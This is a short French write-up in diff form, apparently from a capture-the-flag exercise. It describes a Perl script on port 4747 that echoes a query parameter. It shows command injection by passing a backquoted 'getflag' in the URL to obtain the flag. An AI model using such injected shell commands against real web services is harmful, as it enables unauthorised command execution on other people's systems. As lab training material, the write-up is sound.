@@ -1,0 +1,10 @@
+dans le home de l'user level04 il y a un script en perl qui s'execute en arriere plan qui attends une connection sur localhost:4747
+on peut acceder au site en allant sur l'ip de la vm:4747
+le script demande un parametre x , en ajoutant 42 a l'adresse
+http://192.168.1.24:4747/?x=42
+le site affiche bien 42,
+en mettant
+http://192.168.1.10:4747/?x=getflag
+le site affiche getflag
+en escapant avec des backquotes,
+http://192.168.1.10:4747/?x=`getflag` le site nous donne le flag
